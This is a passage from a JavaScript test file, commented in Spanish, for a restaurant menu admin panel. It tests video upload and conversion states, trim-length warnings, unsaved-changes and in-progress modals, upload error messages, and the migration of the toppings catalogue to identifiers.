		const m = pintar(true, conVideo, pantalla(), listo('horizontal'));
		assert.equal(m.videoRetirado.style.display, 'none');
	});

	test('sin master no se ofrece, aunque el trabajo esté listo', () => {
		// La vuelta se hace reconvirtiendo desde el master. Sin él, el botón
		// fallaría al pulsarlo — y un botón que falla es peor que no tenerlo.
		const m = pintar(true, { id: 'p1' }, pantalla(), listo('horizontal', false));
		assert.equal(m.videoRetirado.style.display, 'none');
	});

	test('un plato que nunca tuvo video no lo ofrece', () => {
		const m = pintar(true, { id: 'p1' }, pantalla(), []);
		assert.equal(m.videoRetirado.style.display, 'none');
	});

	test('los dos avisos no se enseñan a la vez', () => {
		// Son estados excluyentes: "recupéralo" pide que no haya video y
		// "está desfasado" pide que sí. Verlos juntos sería incoherente.
		const conM = pintar(true, conVideo, pantalla(), listo('vertical'));
		assert.equal(conM.videoRetirado.style.display, 'none');
		assert.equal(conM.videoDesfasado.style.display, 'block');

		const sinM = pintar(true, { id: 'p1' }, pantalla(), listo('vertical'));
		assert.equal(sinM.videoRetirado.style.display, 'block');
		assert.equal(sinM.videoDesfasado.style.display, 'none');
	});

	// ── EL VIDEO QUE QUEDÓ EN EL FORMATO ANTERIOR ─────────────
	// Cambiar el modelo de la carta no re-recorta los videos ya convertidos: se
	// quedan como estaban y el restaurante ve una franja del centro creyendo
	// que la conversión salió mal. El master permite arreglarlo sin volver a
	// grabar, pero solo si el panel dice que se puede.
	const conVideo = { id: 'p1', atributos: { video: { url: 'https://ejemplo.test/uploads/videos/a.mp4' } } };
	const listo = (formato, tiene_master = true) => [{
		id: 't1', producto_id: 'p1', estado: 'listo', formato, tiene_master,
		creado_en: '2026-08-26T10:00:00Z',
	}];

	test('un video en el formato de la carta no avisa de nada', () => {
		const m = pintar(true, conVideo, pantalla(), listo('vertical'), [], 'vertical');
		assert.equal(m.videoDesfasado.style.display, 'none');
	});

	test('un video apaisado en una carta vertical ofrece reconvertir', () => {
		const m = pintar(true, conVideo, pantalla(), listo('horizontal'), [], 'vertical');
		assert.equal(m.videoDesfasado.style.display, 'block');
		assert.match(m.videoDesfasadoTexto.textContent, /vertical/);
		assert.equal(m.btnReconvertir.disabled, false);
	});

	test('sin master no se ofrece: no hay de dónde volver a cortar', () => {
		// Ofrecer un botón que va a fallar no le dice a nadie por qué.
		const m = pintar(true, conVideo, pantalla(), listo('horizontal', false), [], 'vertical');
		assert.equal(m.videoDesfasado.style.display, 'none');
	});

	test('sin video publicado tampoco hay nada desfasado', () => {
		const m = pintar(true, { id: 'p1' }, pantalla(), listo('horizontal'), [], 'vertical');
		assert.equal(m.videoDesfasado.style.display, 'none');
	});

	// ── LO QUE GENERÓ EL MODELO ───────────────────────────────
	// Un video generado se convierte igual que cualquier otro, pero el plato
	// no lo enseña hasta que alguien lo mira. Estas tres comprueban que el
	// panel refleja esa diferencia, porque para la cola los dos son 'listo'.
	const generado = {
		id: 'trab-ia', producto_id: 'p1', creado_en: '2026-08-26T10:00:00Z',
		video: 'https://ejemplo.test/uploads/videos/ia.mp4',
		portada: 'https://ejemplo.test/uploads/miniaturas/ia.jpg',
	};

	test('un video generado esperando revisión se enseña con su bloque', () => {
		const m = pintar(true, { id: 'p1' }, pantalla(), [], [generado]);
		assert.equal(m.iaRevision.style.display, 'block');
		assert.equal(m.iaRevisionVideo.src, generado.video);
		assert.equal(m.iaRevisionVideo.poster, generado.portada);
	});

	test('el bloque de revisión convive con el video ya publicado', () => {
		// Un plato puede tener video en la carta Y una animación nueva
		// esperando. Los dos tienen que verse: sin comparar no hay decisión.
		const url = 'https://ejemplo.test/uploads/videos/viejo.mp4';
		const m = pintar(true, { id: 'p1', atributos: { video: { url } } }, pantalla(), [], [generado]);
		assert.equal(m.videoEditPreview.src, url);
		assert.equal(m.iaRevision.style.display, 'block');
	});

	test('el video en revisión no se arrastra al siguiente plato', () => {
		// Mismo fallo que con la previsualización de arriba, y aquí es peor:
		// se aprobaría para un plato el video generado de otro.
		const m = pantalla();
		pintar(true, { id: 'p1' }, m, [], [generado]);
		pintar(true, { id: 'p2' }, m, [], [generado]);
		assert.equal(m.iaRevision.style.display, 'none');
		assert.equal(m.iaRevisionVideo.src, undefined);
	});

	test('un plato sin video no arrastra el del anterior', () => {
		// El elemento <video> es el mismo para todos los platos: si no se le
		// quita el src, abrir un plato sin video enseña el del que se miró antes.
		const m = pantalla();
		pintar(true, { id: 'p1', atributos: { video: { url: 'https://ejemplo.test/a.mp4' } } }, m);
		pintar(true, { id: 'p2' }, m);
		assert.equal(m.videoEditPreview.src, undefined, 'debe soltar el src del plato anterior');
		assert.equal(m.videoEditPreview.style.display, 'none');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('avisarSiSePasaElVideo · el trozo elegido tiene que caber', () => {
	// Se guardan 8 segundos desde el punto que marque el restaurante. Si
	// elige uno donde ya no quedan 8, el video sale más corto — y eso se
	// sabe antes de subir nada, no después de esperar minuto y medio a que
	// ffmpeg termine.
	const conVideo = (duracion, desde) => {
		const mapa = {
			videoEditPreview:  { duration: duracion },
			videoDesde:        { value: String(desde) },
			videoDesdeAviso:   { textContent: 'sucio', style: {} },
			btnConfirmarVideo: { disabled: false, style: {} },
		};
		const ctx = cargar('index.html', 'const DURACION_MIN_VIDEO',
			'async function confirmarSubidaVideo',
			{ document: { getElementById: id => mapa[id] } });
		ctx.avisarSiSePasaElVideo();
		return { aviso: mapa.videoDesdeAviso.textContent, bloqueado: mapa.btnConfirmarVideo.disabled };
	};

	test('con hueco de sobra no dice nada', () => {
		assert.equal(conVideo(30, 5).aviso, '', 'quedan 25 s, no hay nada que avisar');
	});

	test('justo en el límite tampoco', () => {
		assert.equal(conVideo(30, 22).aviso, '', 'quedan exactamente 8 s');
	});

	test('avisa cuando el trozo se queda corto', () => {
		assert.match(conVideo(30, 26).aviso, /4\.0 s/, 'quedan 4 s y hay que decirlo');
	});

	test('no muestra segundos negativos si se pasa del final', () => {
		// Escribir 40 en un video de 30 daba "-10.0 s", que no significa nada.
		assert.match(conVideo(30, 40).aviso, /0\.0 s/);
	});

	test('sin metadatos todavía no aventura nada', () => {
		// La duración no se conoce hasta loadedmetadata; hasta entonces es NaN
		// y un aviso calculado con eso sería basura.
		assert.equal(conVideo(NaN, 5).aviso, '');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('avisarSiSePasaElVideo · lo demasiado corto no se sube', () => {
	// Idea del propio usuario, y es mejor que convertirlo igual: un bucle de
	// un segundo en una carta marea. Más vale decirlo antes de que suban
	// treinta megas para nada.
	const conVideo = (duracion, desde) => {
		const mapa = {
			videoEditPreview:  { duration: duracion },
			videoDesde:        { value: String(desde) },
			videoDesdeAviso:   { textContent: '', style: {} },
			btnConfirmarVideo: { disabled: false, style: {} },
		};
		const ctx = cargar('index.html', 'const DURACION_MIN_VIDEO',
			'async function confirmarSubidaVideo',
			{ document: { getElementById: id => mapa[id] } });
		ctx.avisarSiSePasaElVideo();
		return { aviso: mapa.videoDesdeAviso.textContent, bloqueado: mapa.btnConfirmarVideo.disabled };
	};

	test('un video de un segundo no deja subir', () => {
		const r = conVideo(1, 0);
		assert.equal(r.bloqueado, true);
		assert.match(r.aviso, /al menos 3/);
	});

	test('justo en el mínimo sí deja', () => {
		assert.equal(conVideo(3, 0).bloqueado, false, '3 s exactos son válidos');
	});

	test('un video largo con el punto casi al final tampoco deja', () => {
		// Lo que importa no es cuánto dura el original sino cuánto queda desde
		// donde empieza el recorte.
		assert.equal(conVideo(40, 38).bloqueado, true, 'quedan 2 s de 40');
		assert.equal(conVideo(40, 30).bloqueado, false, 'quedan 10 s');
	});

	test('volver a un punto válido vuelve a permitir', () => {
		// El botón se deshabilita, y si no se rehabilitara al corregir el
		// número el usuario se quedaría encerrado sin saber por qué.
		assert.equal(conVideo(20, 19).bloqueado, true);
		assert.equal(conVideo(20, 5).bloqueado, false);
	});

	test('sin metadatos no se bloquea nada', () => {
		// La duración llega con loadedmetadata. Bloquear antes dejaría el botón
		// muerto en los milisegundos previos y parecería roto.
		assert.equal(conVideo(NaN, 0).bloqueado, false);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('cambios sin guardar · la ficha no se cierra en silencio', () => {
	// Un clic fuera del modal lo cerraba y se llevaba lo escrito. Se compara
	// una firma del formulario en vez de levantar una bandera al primer
	// tecleo: escribir algo y borrarlo no debe contar como cambio, porque
	// preguntar cuando no hay nada que perder enseña a decir que sí sin leer.
	const montar = ({ videoElegido = null, subiendoVideo = false, enCurso = null, vigilando = null } = {}) => {
		const mapa = {
			editNombre:       { value: 'Croquetas' },
			editCategoria:    { value: 'cat-1' },
			editPrecioNum:    { value: '24000' },
			editDesc:         { value: '' },
			editDescAvanzada: { value: '' },
			editDisponible:   { checked: true },
			editProductId:    { value: 'p1' },
			procesoTexto:     { textContent: '' },
			procesoTitulo:    { textContent: '' },
			procesoNota:      { textContent: '' },
			procesoSeguir:    { textContent: '' },
			procesoSalir:     { style: {} },
		};
		const abiertos = [], cerrados = [];
		const ctx = cargar('index.html', 'function firmaProducto', 'async function saveProduct', {
			state: { pendingImgUrl: null, extraImgs: [], prodFiltros: [], prodBadges: {}, subiendoVideo, vigilandoTrabajo: vigilando },
			videoElegido,
			document: { getElementById: id => mapa[id] },
			openModal:  id => abiertos.push(id),
			closeModal: id => cerrados.push(id),
			trabajoEnCursoDe: () => enCurso,
		});
		return { ctx, mapa, abiertos, cerrados };
	};

	test('sin tocar nada, no hay cambios', () => {
		const { ctx } = montar();
		ctx.fijarFirmaProducto();
		assert.equal(ctx.productoTieneCambios(), false);
	});

	test('cambiar un campo cuenta como cambio', () => {
		const { ctx, mapa } = montar();
		ctx.fijarFirmaProducto();
		mapa.editNombre.value = 'Croquetas de jamón';
		assert.equal(ctx.productoTieneCambios(), true);
	});

	test('escribir y deshacer NO cuenta como cambio', () => {
		// Lo que evita el aviso inútil que la gente aprende a ignorar.
		const { ctx, mapa } = montar();
		ctx.fijarFirmaProducto();
		mapa.editPrecioNum.value = '99000';
		assert.equal(ctx.productoTieneCambios(), true, 'mientras está cambiado, sí');
		mapa.editPrecioNum.value = '24000';
		assert.equal(ctx.productoTieneCambios(), false, 'al volver al valor original, no');
	});

	test('el interruptor de disponible también cuenta', () => {
		const { ctx, mapa } = montar();
		ctx.fijarFirmaProducto();
		mapa.editDisponible.checked = false;
		assert.equal(ctx.productoTieneCambios(), true);
	});

	test('un video elegido y sin subir es trabajo por perder', () => {
		// Hay que volver a buscar el archivo y a marcar el segundo de inicio.
		const { ctx } = montar({ videoElegido: { name: 'plato.mp4' } });
		ctx.fijarFirmaProducto();
		assert.equal(ctx.productoTieneCambios(), false, 'si ya estaba al abrir, no es un cambio');

		const otra = montar();
		otra.ctx.fijarFirmaProducto();
		// Simular que se elige un archivo después de abrir la ficha.
		otra.ctx.videoElegido = { name: 'plato.mp4' };
		assert.equal(otra.ctx.productoTieneCambios(), true);
	});

	test('sin cambios, cerrar cierra directo', () => {
		const { ctx, abiertos, cerrados } = montar();
		ctx.fijarFirmaProducto();
		ctx.intentarCerrarProducto();
		assert.deepEqual(cerrados, ['productModal']);
		assert.deepEqual(abiertos, [], 'no hay por qué preguntar nada');
	});

	test('con cambios, cerrar pregunta antes', () => {
		const { ctx, mapa, abiertos, cerrados } = montar();
		ctx.fijarFirmaProducto();
		mapa.editNombre.value = 'Otra cosa';
		ctx.intentarCerrarProducto();
		assert.deepEqual(abiertos, ['cambiosModal']);
		assert.deepEqual(cerrados, [], 'la ficha sigue abierta hasta que decida');
	});

	// ── UN VIDEO A MEDIAS NO SON CAMBIOS SIN GUARDAR ──────────
	// Salía ese aviso, porque el archivo elegido cuenta en la firma. Y su
	// texto —"si sales ahora se pierden"— dice lo contrario de lo que pasa:
	// ni la subida ni la conversión se cortan al cerrar. Quien lo leía se
	// quedaba esperando por miedo a perder algo que no se perdía.
	//
	// Es su propia ventana y no el confirm() del navegador: el panel ya tiene
	// un patrón para "vas a salir de algo" y meter un diálogo del sistema en
	// medio lo rompe, en el móvil sobre todo. Y es una ventana APARTE de la de
	// cambios sin guardar porque dice lo contrario que aquella; usar la misma
	// para las dos cosas enseñaría a no leerla.

	test('subiendo, sale la ventana del proceso y no la de cambios', () => {
		const { ctx, mapa, abiertos } = montar({ subiendoVideo: true, videoElegido: { name: 'a.mp4' } });
		ctx.fijarFirmaProducto();
		ctx.intentarCerrarProducto();

		assert.deepEqual(abiertos, ['procesoModal'], 'la de cambios diría algo falso aquí');
		assert.match(mapa.procesoTexto.textContent, /Espera a que termine de subir/);
	});

	test('subiendo, NO se puede salir: la ventana no trae botón de salir', () => {
		// 18/09/2026, decidido con el equipo: antes avisaba y dejaba cerrar.
		const { ctx, mapa } = montar({ subiendoVideo: true });
		ctx.fijarFirmaProducto();
		ctx.intentarCerrarProducto();

		assert.equal(mapa.procesoSalir.style.display, 'none');
		assert.equal(mapa.procesoSeguir.textContent, 'Entendido');
		assert.match(mapa.procesoNota.textContent, /recargues/, 'recargar sí corta la subida: hay que decirlo');
	});

	test('convirtiendo tampoco se puede salir', () => {
		// Pedido el 18/09/2026, tras bloquear la subida: el equipo quiere que se
		// vea terminar, que es donde aparece un fallo.
		const { ctx, mapa } = montar({ enCurso: { id: 't1' }, vigilando: 't1' });
		ctx.fijarFirmaProducto();
		ctx.intentarCerrarProducto();

		assert.equal(mapa.procesoSalir.style.display, 'none');
		assert.equal(mapa.procesoSeguir.textContent, 'Entendido');
	});

	test('si ya nadie vigila el trabajo, se vuelve a poder salir', () => {
		// La vigilancia se rinde a la media hora y los datos dejan de
		// refrescarse: el trabajo figuraría «en marcha» para siempre, y
		// bloquear sería encerrar a alguien en la ficha sin salida.
		const { ctx, mapa } = montar({ enCurso: { id: 't1' }, vigilando: null });
		ctx.fijarFirmaProducto();
		ctx.intentarCerrarProducto();

		assert.equal(mapa.procesoSalir.style.display, '');
		assert.match(mapa.procesoTexto.textContent, /más de lo normal/);
	});

	test('vigilar OTRO trabajo no cuenta como vigilar este', () => {
		const { ctx, mapa } = montar({ enCurso: { id: 't1' }, vigilando: 't2' });
		ctx.fijarFirmaProducto();
		ctx.intentarCerrarProducto();

		assert.equal(mapa.procesoSalir.style.display, '');
	});

	test('convirtiendo también, aunque no haya nada en el formulario', () => {
		// Este era el hueco: la subida al menos ensuciaba la firma y disparaba
		// el aviso equivocado. La conversión no dejaba rastro y la ficha se
		// cerraba en silencio.
		const { ctx, mapa, abiertos } = montar({ enCurso: { id: 't1' }, vigilando: 't1' });
		ctx.fijarFirmaProducto();
		ctx.intentarCerrarProducto();

		assert.deepEqual(abiertos, ['procesoModal']);
		assert.match(mapa.procesoTexto.textContent, /termine de convertirse/);
	});

	test('mientras la ventana está abierta, la ficha no se cierra', () => {
		const { ctx, cerrados } = montar({ subiendoVideo: true });
		ctx.fijarFirmaProducto();
		ctx.intentarCerrarProducto();

		assert.deepEqual(cerrados, [], 'se cierra al elegir, no antes');
	});

	test('convirtiendo, "Cerrar de todos modos" no cierra nada', () => {
		const { ctx, cerrados } = montar({ enCurso: { id: 't1' }, vigilando: 't1' });
		ctx.fijarFirmaProducto();
		ctx.salirConProcesoEnMarcha();

		assert.deepEqual(cerrados, []);
	});

	test('sin nadie vigilando, "Cerrar de todos modos" cierra las dos ventanas', () => {
		const { ctx, cerrados } = montar({ enCurso: { id: 't1' } });
		ctx.fijarFirmaProducto();
		ctx.salirConProcesoEnMarcha();

		assert.deepEqual(cerrados, ['procesoModal', 'productModal']);
	});

	test('subiendo, "Cerrar de todos modos" no cierra nada', () => {
		// Si la subida empezó con la ventana de «convirtiendo» ya abierta, su
		// botón seguiría a la vista: la guarda es de la función, no del botón.
		const { ctx, cerrados, mapa } = montar({ subiendoVideo: true });
		ctx.fijarFirmaProducto();
		ctx.salirConProcesoEnMarcha();

		assert.deepEqual(cerrados, []);
		assert.equal(mapa.procesoSalir.style.display, 'none');
	});

	test('recargar la página con un video subiendo pide el aviso del navegador', () => {
		const escuchas = {};
		const ctx = cargar('video-subiendo.js', [['video-subiendo.js', 'window.addEventListener', null]], {
			window: { addEventListener: (ev, f) => { escuchas[ev] = f; } },
			state: { subiendoVideo: false },
		});
		const evento = () => ({ bloqueado: false, preventDefault() { this.bloqueado = true; } });
		const libre = evento();
		escuchas.beforeunload(libre);
		assert.equal(libre.bloqueado, false, 'sin subida, recargar no pregunta nada');
		ctx.state.subiendoVideo = true;
		const subiendo = evento();
		escuchas.beforeunload(subiendo);
		assert.equal(subiendo.bloqueado, true);
	});

	test('el proceso manda sobre los cambios del formulario', () => {
		// Con las dos cosas a la vez solo se puede enseñar una ventana, y la
		// que importa es la que el usuario no se espera.
		const { ctx, mapa, abiertos } = montar({ subiendoVideo: true });
		ctx.fijarFirmaProducto();
		mapa.editNombre.value = 'Otra cosa';
		ctx.intentarCerrarProducto();

		assert.deepEqual(abiertos, ['procesoModal']);
	});

	test('sin proceso en marcha, todo sigue como antes', () => {
		// La guarda de typeof no puede acabar disparando la ventana siempre.
		const { ctx, abiertos, cerrados } = montar();
		ctx.fijarFirmaProducto();
		ctx.intentarCerrarProducto();

		assert.deepEqual(abiertos, []);
		assert.deepEqual(cerrados, ['productModal']);
	});

	test('salir sin guardar cierra las dos ventanas', () => {
		const { ctx, mapa, cerrados } = montar();
		ctx.fijarFirmaProducto();
		mapa.editNombre.value = 'Otra cosa';
		ctx.salirSinGuardar();
		assert.deepEqual(cerrados, ['cambiosModal', 'productModal']);
	});

	test('sin firma fijada no molesta', () => {
		// Estado de arranque, antes de abrir ninguna ficha: no hay nada que
		// comparar y no se puede inventar un cambio.
		const { ctx } = montar();
		assert.equal(ctx.productoTieneCambios(), false);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('ajustarFichaAlModelo · cada modelo enseña lo suyo', () => {
	// La misma ficha sirve para todos los modelos. Un control que no hace
	// nada es peor que no tenerlo: quien lo usa cree que está trabajando.
	const conModelo = nav => {
		const mapa = {
			extraImgsGroup:   { style: {} },
			labelImagen:      { innerHTML: '' },
			labelVideo:       { innerHTML: '' },
			videoEditPreview: { style: {} },
		};
		// Dos trozos: la lista de modelos que pintan video y la función que
		// la consulta. Se cargan los dos del fuente en vez de escribir la
		// lista aquí, para que añadir un encuadre nuevo al panel y olvidarse
		// de esta prueba no dé un falso verde.
		const ctx = cargar('index.html', [
			['// ── MODELOS QUE PINTAN VIDEO', 'function idPlanActual'],
			['function ajustarFichaAlModelo', '// ── CAMBIOS SIN GUARDAR'],
		], {
			state: { restaurante: { atributos: { nav } } },
			document: { getElementById: id => mapa[id] },
		});
		ctx.ajustarFichaAlModelo();
		return mapa;
	};

	test('los modelos de video esconden las imágenes adicionales', () => {
		// Ni temas/video.js ni temas/vertical.js leen atributos.imagenes en
		// ninguna parte: subirlas ahí es subirlas para nadie.
		for (const nav of ['video', 'vertical'])
			assert.equal(conModelo(nav).extraImgsGroup.style.display, 'none', `en ${nav}`);
	});

	test('los demás modelos las siguen enseñando', () => {
		for (const nav of ['topnav', 'sidebar', 'carrito', 'explorar'])
			assert.equal(conModelo(nav).extraImgsGroup.style.display, '', `en ${nav}`);
	});

	test('en los modelos de video, la foto se explica como respaldo', () => {
		// Deja de ser lo que se ve y pasa a ser lo que se ve mientras no haya
		// video. Eso hay que decirlo donde se mira, no en un manual.
		for (const nav of ['video', 'vertical'])
			assert.match(conModelo(nav).labelImagen.innerHTML, /mientras el plato no tenga video/, `en ${nav}`);
	});

	test('en los demás la etiqueta se queda limpia', () => {
		assert.equal(conModelo('topnav').labelImagen.innerHTML, 'Imagen');
	});

	test('un restaurante sin modelo declarado no se rompe', () => {
		// atributos.nav vacío es 'topnav' por defecto en el menú público.
		const mapa = conModelo(undefined);
		assert.equal(mapa.extraImgsGroup.style.display, '');
		assert.equal(mapa.labelImagen.innerHTML, 'Imagen');
	});

	test('la proporción prometida es la que el worker va a cortar', () => {
		// El servidor deriva el formato del modelo: 'vertical' pide 720x1280 y
		// todo lo demás 1280x720. Si la ficha dijera 16:9 a un restaurante
		// vertical, estaría prometiendo un recorte que no se va a hacer.
		assert.match(conModelo('vertical').labelVideo.innerHTML, /9:16/);
		for (const nav of ['video', 'topnav', 'carrito', undefined])
			assert.match(conModelo(nav).labelVideo.innerHTML, /16:9/, `en ${nav}`);
	});

	test('la previsualización tiene el hueco del formato que se guarda', () => {
		// Con el hueco apaisado clavado, un 9:16 entra recortado por object-fit
		// y enseña una franja del centro: parece que la conversión salió mal
		// cuando salió bien.
		assert.equal(conModelo('vertical').videoEditPreview.style.aspectRatio, '9 / 16');
		assert.equal(conModelo('video').videoEditPreview.style.aspectRatio, '16 / 9');
		assert.equal(conModelo('topnav').videoEditPreview.style.aspectRatio, '16 / 9');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('mensajeDeSubida · qué se lee cuando falla un video', () => {
	// Un video son decenas de megas por una conexión doméstica. El panel
	// enseñaba "Error" a secas para todas las formas de fallar ahí, y con eso
	// no se puede diagnosticar nada: pasó de verdad con el Tartar de Indigo y
	// hubo que reconstruirlo desde los registros de Supabase.
	const { mensajeDeSubida } = cargar('index.html',
		'function mensajeDeSubida', 'function enviarVideo', {});

	test('cortarse a medias dice por dónde iba', () => {
		// El porcentaje es lo que separa "es tu conexión" de "es el servidor".
		assert.match(mensajeDeSubida({ tipo: 'red', porcentaje: 8.4 }),  /8%/);
		assert.match(mensajeDeSubida({ tipo: 'red', porcentaje: 61.7 }), /62%/);
		assert.match(mensajeDeSubida({ tipo: 'red', porcentaje: 61.7 }), /no llegó entero/);
	});

	test('subido entero y sin respuesta NO invita a reintentar', () => {
		// Aquí el trabajo puede estar ya encolado. Decir "vuelve a intentarlo"
		// es pedir el mismo video dos veces y dejar uno huérfano en el disco.
		const m = mensajeDeSubida({ tipo: 'red', porcentaje: 100 });
		assert.match(m, /se subió entero/);
		assert.ok(!/vuelve a intentarlo/i.test(m), 'no debe empujar a reintentar');
	});

	test('lo que explique el servidor manda sobre cualquier texto nuestro', () => {
		// "El archivo pasa del límite de 200 MB" y "Solo MP4 o MOV" están
		// escritos para leerse; taparlos con un genérico sería peor.
		assert.equal(
			mensajeDeSubida({ tipo: 'http', estado: 400, error: 'Solo MP4 o MOV' }),
			'Solo MP4 o MOV');
		assert.equal(
			mensajeDeSubida({ tipo: 'http', estado: 507, error: 'No hay espacio suficiente en el servidor' }),
			'No hay espacio suficiente en el servidor');
	});

	test('un estado sin cuerpo legible no se queda en "Error"', () => {
		// Es exactamente el caso que no supimos leer: algo por delante del
		// servidor contesta su propia página HTML y el panel no la entiende.
		assert.match(mensajeDeSubida({ tipo: 'http', estado: 413 }), /413/);
		assert.match(mensajeDeSubida({ tipo: 'http', estado: 413 }), /tamaño/);
		for (const estado of [502, 503, 504])
			assert.match(mensajeDeSubida({ tipo: 'http', estado }), new RegExp(String(estado)));
		assert.match(mensajeDeSubida({ tipo: 'http', estado: 418 }), /418/);
	});

	test('ningún camino devuelve vacío ni la palabra "Error" a secas', () => {
		const casos = [
			{ tipo: 'red', porcentaje: 0 }, { tipo: 'red', porcentaje: 100 },
			{ tipo: 'http', estado: 400 }, { tipo: 'http', estado: 413 },
			{ tipo: 'http', estado: 500 }, { tipo: 'http', estado: 504 },
			{ tipo: 'http', estado: 0 },
		];
		for (const c of casos) {
			const m = mensajeDeSubida(c);
			assert.ok(m && m.length > 20, `mensaje pobre en ${JSON.stringify(c)}: ${m}`);
			assert.notEqual(m, 'Error');
		}
	});
});

// ═══════════════════════════════════════════════════════════════
describe('trabajoEnCursoDe · una conversión en marcha se ve al reabrir', () => {
	// La vigilancia sobrevive a cerrar la ficha, pero no a recargar la página.
	// Sin esto, el plato vuelve a decir "Sin video" mientras el worker todavía
	// lo tiene, y lo natural es subirlo otra vez: dos videos buenos para el
	// mismo plato y un original huérfano ocupando disco.
	const conTrabajos = trabajos => {
		const ctx = cargar('index.html', 'function trabajoFallidoDe', 'async function descartarVideoFallido',
			{ state: { trabajosVideo: trabajos } });
		return ctx;
	};

	const t = (id, producto_id, estado, creado_en) => ({ id, producto_id, estado, creado_en });

	test('encuentra el que espera turno y el que ya está en ffmpeg', () => {
		// Para quien mira la ficha son lo mismo: su video no está todavía.
		for (const estado of ['pendiente', 'procesando']) {
			const ctx = conTrabajos([t('t1', 'p1', estado, '2026-08-20T10:00:00Z')]);
			assert.equal(ctx.trabajoEnCursoDe('p1')?.id, 't1', `con estado ${estado}`);
		}
	});

	test('lo terminado no cuenta como en marcha', () => {
		// Si 'listo' contara, el botón de subir se quedaría apagado para
		// siempre en cuanto el plato tuviera un video.
		for (const estado of ['listo', 'error']) {
			const ctx = conTrabajos([t('t1', 'p1', estado, '2026-08-20T10:00:00Z')]);
			assert.equal(ctx.trabajoEnCursoDe('p1'), null, `con estado ${estado}`);
		}
	});

	test('no se cruzan los platos', () => {
		const ctx = conTrabajos([t('t1', 'otro', 'procesando', '2026-08-20T10:00:00Z')]);
		assert.equal(ctx.trabajoEnCursoDe('p1'), null);
	});

	test('con varios, el más reciente', () => {
		const ctx = conTrabajos([
			t('viejo', 'p1', 'pendiente',  '2026-08-20T10:00:00Z'),
			t('nuevo', 'p1', 'procesando', '2026-08-20T11:00:00Z'),
		]);
		assert.equal(ctx.trabajoEnCursoDe('p1').id, 'nuevo');
	});

	test('sin trabajos cargados no revienta', () => {
		// planActual().videos falso deja state.trabajosVideo en [], y un fallo
		// de red lo deja igual: la ficha tiene que abrirse de todas formas.
		for (const v of [[], undefined, null])
			assert.equal(conTrabajos(v).trabajoEnCursoDe('p1'), null, `con ${JSON.stringify(v)}`);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('catalogoDe · el catálogo de toppings, en una sola forma', () => {
	// Espejo de catalogoDe() en core/carrito.js del menú público. El catálogo
	// se ha guardado de tres maneras: cadenas sueltas, objeto con precio y
	// objeto con identificador. Las tres tienen que dar lo mismo, o el panel y
	// la carta enseñarían cosas distintas.
	const crudo = () => cargar('index.html', 'function catalogoDe',
		'// ── PERSONALIZACIÓN DEL PLATO', {}).catalogoDe;
	// El vm corre en otro realm: lo que crea allí no comparte prototipos con lo
	// de aquí y deepEqual estricto lo rechaza aunque la forma coincida.
	const normalizar = attr => JSON.parse(JSON.stringify(crudo()(attr)));

	test('una cadena suelta usa su nombre como identificador', () => {
		// Es la pieza que sostiene la migración: sin ella, un plato guardado con
		// nombres y un catálogo ya migrado no se encontrarían nunca.
		const c = normalizar({ toppings_platino: ['Queso'], salsas: ['BBQ'] });
		assert.deepEqual(c.platino, [{ id: 'Queso', nombre: 'Queso' }]);
		assert.deepEqual(c.salsas,  [{ id: 'BBQ', nombre: 'BBQ' }]);
	});

	test('con identificador, manda el identificador', () => {
		const c = normalizar({ toppings_premium: [{ id: 'top_1', nombre: 'Tocineta', precio: 4000 }] });
		assert.deepEqual(c.premium, [{ id: 'top_1', nombre: 'Tocineta', precio: 4000 }]);
	});

	test('un premium sin precio vale cero, no NaN', () => {
		assert.equal(normalizar({ toppings_premium: [{ nombre: 'X', precio: 'abc' }] }).premium[0].precio, 0);
	});

	test('la basura se cae en vez de pintarse', () => {
		// atributos es JSON libre: lo que entre raro no puede acabar como un
		// chip vacío en la pestaña.
		const c = normalizar({ toppings_platino: ['', null, '  ', 'Queso'], salsas: 'no soy lista' });
		assert.deepEqual(c.platino.map(t => t.nombre), ['Queso']);
		assert.deepEqual(c.salsas, []);
	});

	test('sin catálogo devuelve las tres listas vacías', () => {
		assert.deepEqual(normalizar({}),   { platino: [], premium: [], salsas: [] });
		assert.deepEqual(normalizar(null), { platino: [], premium: [], salsas: [] });
	});
});

// ═══════════════════════════════════════════════════════════════
describe('personalizacionDe · qué toppings ofrece un plato', () => {
	// Devuelve siempre IDENTIFICADORES del catálogo de hoy, venga el plato de
	// la época que venga. Traducir aquí es lo que migra los datos solos: en
	// cuanto el restaurante guarde la ficha, lo que se escribe ya son ids.
	const ctx = () => cargar('index.html', [
		['function catalogoDe', '// ── PERSONALIZACIÓN DEL PLATO'],
		['function personalizacionDe', 'function renderPersonalizacion'],
	], {});
	const traducir = (p, attr) => {
		const c = ctx();
		return JSON.parse(JSON.stringify(c.personalizacionDe(p, c.catalogoDe(attr))));
	};

	const CATALOGO = {
		toppings_platino: [{ id: 't_ceb', nombre: 'Cebolla' }, { id: 't_tom', nombre: 'Tomate' }],
		toppings_premium: [{ id: 't_toc', nombre: 'Tocineta', precio: 4000 }],
		salsas:           [{ id: 't_bbq', nombre: 'BBQ' }],
	};

	test('un plato ya migrado se lee tal cual', () => {
		assert.deepEqual(traducir({ atributos: { personalizacion: {
			platino: ['t_ceb'], premium: ['t_toc'], salsas: ['t_bbq'],
		} } }, CATALOGO), { platino: ['t_ceb'], premium: ['t_toc'], salsas: ['t_bbq'] });
	});

	test('un plato guardado con NOMBRES se traduce a identificadores', () => {
		// La ventana de la migración: el catálogo ya tiene ids y el plato
		// todavía no. Se encuentran igual, y al guardar la ficha queda migrado.
		assert.deepEqual(traducir({ atributos: { personalizacion: {
			platino: ['Cebolla'], premium: ['Tocineta'], salsas: ['BBQ'],
		} } }, CATALOGO), { platino: ['t_ceb'], premium: ['t_toc'], salsas: ['t_bbq'] });
	});

	test('RENOMBRAR un topping ya no desengancha el plato', () => {
		// El motivo entero de que exista el identificador.
		const renombrado = { ...CATALOGO, toppings_platino: [{ id: 't_ceb', nombre: 'Cebolla caramelizada' }] };
		assert.deepEqual(traducir({ atributos: { personalizacion: { platino: ['t_ceb'] } } }, renombrado).platino,
			['t_ceb'], 'sigue marcado');
	});

	test('lo que ya no está en el catálogo se cae', () => {
		const r = traducir({ atributos: { personalizacion: { platino: ['t_ceb', 't_borrado'] } } }, CATALOGO);
		assert.deepEqual(r.platino, ['t_ceb']);
	});

